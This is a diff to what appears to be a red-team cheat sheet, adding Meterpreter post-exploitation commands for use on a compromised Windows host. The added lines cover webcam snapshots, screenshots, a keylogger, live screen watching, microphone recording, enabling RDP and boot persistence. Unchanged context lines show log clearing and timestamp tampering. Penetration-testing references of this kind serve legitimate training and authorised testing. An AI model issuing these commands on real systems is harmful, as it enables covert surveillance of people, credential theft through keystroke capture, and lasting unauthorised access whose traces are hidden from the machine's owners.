@@ -126,6 +126,10 @@ meterpreter> search -f pattern / # Search [...] inside /
 meterpreter> download remote_path local_path # Download
 meterpreter> upload local_path remote_path   # Upload
 meterpreter> resolve hostname    # Get the IP from hostname
+meterpreter> idletime        # time the host was idle
+meterpreter> localtime       # time and date
+meterpreter> getenv PATH     # get PATH
+meterpreter> checksum <file> # get file checksum
 ```
 
 You can run commands on your machine in the meterpreter:
@@ -162,8 +166,6 @@ meterpreter> clearev   # clear logs
 meterpreter> timestomp # mess with timestamps
 ```
 
-<br>
-
 #### Meterpreter — Pivoting
 
 Refer to [this](/cybersecurity/red-team/s5.post-exploitation/index.md#pivoting-to-another-host-) for tunneling/port forwarding.
@@ -172,28 +174,63 @@ Refer to [this](/cybersecurity/red-team/s5.post-exploitation/index.md#pivoting-t
 meterpreter> run post/windows/gather/checkvm
 ```
 
-<br>
+#### Meterpreter — Take control of the webcam
 
-#### Meterpreter — Basic Post-Exploitation Commands
+```shell!
+meterpreter> webcam_list
+meterpreter> webcam_snap
+```
 
-...
+#### Meterpreter — Take a screenshot
+
+You may also use `screenshot` 📌.
+
+```shell!
+meterpreter> migrate -N explorer.exe
+meterpreter> use espia
+meterpreter> screengrab
+```
 </div><div>
 
-#### Meterpreter — Basic Post-Exploitation Commands
+#### Meterpreter — Install a keylogger
 
-...
+```shell!
+meterpreter> migrate -N explorer.exe
+meterpreter> keyscan_start # start
+meterpreter> keyscan_dump # dump keys
+```
 
-<br>
+#### Meterpreter — Watch the screen in real time
 
-#### Meterpreter — Basic Post-Exploitation Commands
+Watch the remote user desktop in real time
 
-...
+```shell!
+meterpreter> screenshare
+meterpreter> record_mic # Record audio from the default microphone for X seconds
+```
 
-<br>
+#### Meterpreter — Record microphone
 
-#### Meterpreter — Basic Post-Exploitation Commands
+Record audio from the default microphone for X seconds
 
-...
+```shell!
+meterpreter> record_mic
+```
+
+#### Meterpreter — Enable Remote Desktop Protocol
+
+```shell!
+meterpreter> run post/windows/manage/enable_rdp
+```
+
+#### Meterpreter — Persistence
+
+See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/).
+
+```shell!
+meterpreter> # Automatically start the agent when the system boots
+meterpreter> run persistence -X
+```
 </div></div>
 
 <hr class="sep-both">
